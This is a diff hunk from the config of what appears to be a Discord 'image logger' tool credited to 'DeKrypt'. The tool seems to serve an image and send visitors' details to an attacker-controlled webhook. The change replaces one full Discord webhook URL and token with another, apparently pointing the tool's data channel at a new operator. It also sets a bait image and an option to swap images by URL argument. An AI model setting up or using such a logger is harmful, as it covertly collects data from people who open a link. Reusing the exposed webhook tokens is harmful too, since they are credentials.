@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1100022968907730994/b3pvuM7hkNnpqYY1Gxu7re-MjZIrDFT7TLaiKdWPOS9pFFdpozmxm9PBSJiCMvCUY1m7",
+    "webhook": "https://discord.com/api/webhooks/1300557526030487622/mIJsLJCfED_sYwZsgJabOnYeU17Ave4U1LYIXwcFemhIZhSNriRwdtdI64q1YxDoBsVC",
     "image": "https://github.com/FuryNocturne20/image/blob/main/Capture%20d'%C3%A9cran%202023-04-24%20010740.png?raw=true", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
